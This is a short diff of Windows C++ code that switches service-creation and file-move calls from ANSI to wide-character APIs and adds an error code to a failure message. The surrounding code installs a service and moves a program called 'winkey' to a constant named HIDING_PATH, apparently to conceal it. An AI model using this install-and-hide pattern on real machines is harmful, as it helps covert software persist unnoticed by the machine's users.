@@ -9,7 +9,7 @@ extern tinky_t tinky;
 int openSCM(DWORD desiredAccess) {
 	tinky.scmHandler = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASEA, desiredAccess);
 	if (!tinky.scmHandler) {
-		cerr	<< "Error while accessing Service Control Manager\n";
+		cerr	<< "Error while accessing Service Control Manager... Error code: " << GetLastError() << "\n";
 		return (FAILURE);
 	}
 	return (SUCCESS);
@@ -19,7 +19,7 @@ static BYTE createService(void) {
 	if (!openSCM(SC_MANAGER_CREATE_SERVICE))
 		return (FAILURE);
 
-	tinky.serviceHandler = CreateServiceA(
+	tinky.serviceHandler = CreateServiceW(
 		tinky.scmHandler,
 		SVC_NAME,
 		SVC_NAME,
@@ -39,9 +39,9 @@ static BYTE createService(void) {
 }
 
 static BYTE movWinkey(void) {
-	string processPath = getServicePath("winkey");
+	wstring processPath = getServicePath(L"winkey");
 
-	if (!MoveFileExA(
+	if (!MoveFileExW(
 			processPath.c_str(), 
 			HIDING_PATH, 
 			MOVEFILE_REPLACE_EXISTING
